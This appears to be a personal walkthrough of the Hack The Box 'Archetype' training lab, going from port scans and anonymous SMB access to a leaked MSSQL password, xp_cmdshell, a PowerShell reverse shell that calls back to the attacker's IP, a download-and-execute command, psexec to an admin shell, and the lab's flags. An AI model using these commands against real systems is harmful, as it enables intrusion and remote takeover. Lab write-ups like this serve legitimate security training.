Connect to VPN
>> sudo openvpn startingpoint.ovpn

Map all the ports
>> nmap -p- --min-rate=1000 -T4 10.10.10.27

	Nmap scan report for 10.10.10.27
	Host is up (0.23s latency).
	Not shown: 65515 closed ports
	PORT      STATE    SERVICE
	135/tcp   open     msrpc
	139/tcp   open     netbios-ssn
	445/tcp   open     microsoft-ds
	1433/tcp  open     ms-sql-s
	5985/tcp  open     wsman
	7602/tcp  filtered unknown
	9957/tcp  filtered unknown
	14522/tcp filtered unknown
	34225/tcp filtered unknown
	36614/tcp filtered unknown
	37148/tcp filtered unknown
	43421/tcp filtered unknown
	47001/tcp open     winrm
	48116/tcp filtered unknown
	49664/tcp open     unknown
	49665/tcp open     unknown
	49666/tcp open     unknown
	49667/tcp open     unknown
	49668/tcp open     unknown
	49669/tcp open     unknown

>> grep '^.[0-9]'
Find the pattern: fomr the line start (^), any one symbol aka tab (.),
and then any number ([0-9]). reslt is like
	xxxx/tcp   open     msrpc
	xxxx/tcp   open     msrpc
>> cut -d '/' -f 1
Cut with '/' and take the first half
	XXXX
	XXXX
>> tr '\n' ','
Swapp all new lines into the commas
	XXXX,	XXXX,
>> sed 's/,$//g'
Substitute -- s/this_string/to_this_string/g -- global.
string pattern may be a regexp => $ is the end of the line
	xxxx,	xxxx
>> set ports (cat git/HackTheBox/000-intro/steps | grep '^.[0-9]' | cut -d '/' -f 1 |  tr '\n' ',' | sed 's/,$//g')

>> nmap -sC -sV -p$ports 10.10.10.27

	Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 13:14 AEST
	Nmap scan report for 10.10.10.27
	Host is up (0.23s latency).

	PORT      STATE  SERVICE      VERSION
	135/tcp   open   msrpc        Microsoft Windows RPC
	139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open   microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
	1433/tcp  open   ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
	| ms-sql-ntlm-info: 
	|   Target_Name: ARCHETYPE
	|   NetBIOS_Domain_Name: ARCHETYPE
	|   NetBIOS_Computer_Name: ARCHETYPE
	|   DNS_Domain_Name: Archetype
	|   DNS_Computer_Name: Archetype
	|_  Product_Version: 10.0.17763
	| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
	| Not valid before: 2020-07-30T15:33:59
	|_Not valid after:  2050-07-30T15:33:59
	|_ssl-date: 2020-07-31T03:31:29+00:00; +16m08s from scanner time.
	5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	7602/tcp  closed unknown
	9957/tcp  closed unknown
	14522/tcp closed unknown
	34225/tcp closed unknown
	36614/tcp closed unknown
	37148/tcp closed unknown
	43421/tcp closed unknown
	47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	48116/tcp closed unknown
	49664/tcp open   msrpc        Microsoft Windows RPC
	49665/tcp open   msrpc        Microsoft Windows RPC
	49666/tcp open   msrpc        Microsoft Windows RPC
	49667/tcp open   msrpc        Microsoft Windows RPC
	49668/tcp open   msrpc        Microsoft Windows RPC
	49669/tcp open   msrpc        Microsoft Windows RPC
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

	Host script results:
	|_clock-skew: mean: 1h40m08s, deviation: 3h07m50s, median: 16m07s
	| ms-sql-info: 
	|   10.10.10.27:1433: 
	|     Version: 
	|       name: Microsoft SQL Server 2017 RTM
	|       number: 14.00.1000.00
	|       Product: Microsoft SQL Server 2017
	|       Service pack level: RTM
	|       Post-SP patches applied: false
	|_    TCP port: 1433
	| smb-os-discovery: 
	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
	|   Computer name: Archetype
	|   NetBIOS computer name: ARCHETYPE\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2020-07-30T20:31:16-07:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2020-07-31T03:31:19
	|_  start_date: N/A

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds


>> smbclient -N -L \\\\10.10.10.27\\
Check anonymos access to SMB on 445
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

>> smbclient -N \\\\10.10.10.27\\backups
smb: \> dir
  .                                   D        0  Mon Jan 20 23:20:57 2020
  ..                                  D        0  Mon Jan 20 23:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 23:23:02 2020
smb: \> get prod.dtsConfig

Try to read to some

>> DTSConfiguration -- MSSQL integration configuration

<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>

>> python impacket/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Time to try the creds for the MSSQL

>> SELECT IS_SRVROLEMEMBER('sysadmin')
Yes

>> Enable xp_cmdshell
https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15

EXECUTE sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXECUTE sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  

xp_cmdshell "whoami" -- check the MSSQL user

>> Time to establish a reverse shell

https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Start a server in the directory of in the rs.ps1
>> python3 -m http.server 80
and start listener on 443
>> nc -lvnp 443
if there is a firewall, need to make shure it is open on 80 and 443 ports.

>> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/rs.ps1\");"
download and run the RS

>> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
to see the frequent commands history

>> type C:\Users\sql_svc\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3

>> python impacket/psexec.py administrator@10.10.10.27
from here the real admin shell is avaliable

>> C:\Users\Administrator\Desktop>type root.txt
b91ccec3305e98240082d4474b848528


